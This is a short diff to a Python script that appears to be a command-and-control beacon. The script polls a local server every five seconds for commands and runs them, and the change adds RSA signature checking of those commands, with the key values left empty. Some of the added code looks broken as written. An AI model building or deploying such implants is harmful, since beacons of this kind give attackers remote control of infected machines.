@@ -2,7 +2,10 @@ import subprocess
 import requests
 import time
 import uuid
-import base64
+from hashlib import sha512
+
+exponent = "" # Follow along https://cryptobook.nakov.com/digital-signatures/rsa-sign-verify-examples
+n = "" # We need the generated n, d, and e that the controller generates
 
 def bleh(beacon_command, GUID):
     """
@@ -37,7 +40,11 @@ requests.get(f'https://127.0.0.1:5000/', headers=headers, verify=False)
 while 1:
     a = requests.get(f'https://127.0.0.1:5000/{GUID}.html', headers=headers, verify=False)
     cmd = a.text
+    cmd = cmd.split(';')
     print('got command')
-    bleh(cmd, GUID)
+    hash = int.from_bytes(sha512(cmd[0]).digest(), byteorder='big')
+    hashFromSignature = pow(cmd[1], exponent, n)
+    if hash == hashFromSignature:
+        bleh(cmd[0], GUID)
 
     time.sleep(5)
